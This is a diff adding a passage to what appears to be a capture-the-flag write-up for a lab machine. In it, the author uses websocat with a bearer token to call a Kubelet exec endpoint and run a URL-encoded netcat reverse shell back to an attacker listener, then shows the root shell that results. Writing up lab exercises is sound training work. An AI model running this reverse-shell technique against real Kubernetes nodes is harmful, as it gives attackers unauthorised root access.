@@ -748,8 +748,28 @@ penelope -p 1338
 Ill start a listener
 
 ```python
-
+websocat --insecure --header "Authorization: Bearer $TOKEN" --protocol v4.channel.k8s.io "wss://10.129.244.214:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.61%201338%20%3E%2Ftmp%2Ff"
 ```
 
 Ill then just use a URL encoded netcat reverse shell, to get a reverse shell as root
+
+```python
+penelope -p 1338
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => fireflow 10.129.244.214 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
+[+] Attempting to spawn a reverse shell on 10.10.14.61:1338
+[+] [New Reverse Shell] => fireflow 10.129.244.214 Linux-x86_64 👤 root(0) 😍️ Session ID <2>
+[+] PTY upgrade successful via /bin/script
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/fireflow~10.129.244.214-Linux-x86_64/2026_08_24-19_41_12-297.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+/ # whoami
+root
+/ # 
+```
+
+I now have a root shell!
 
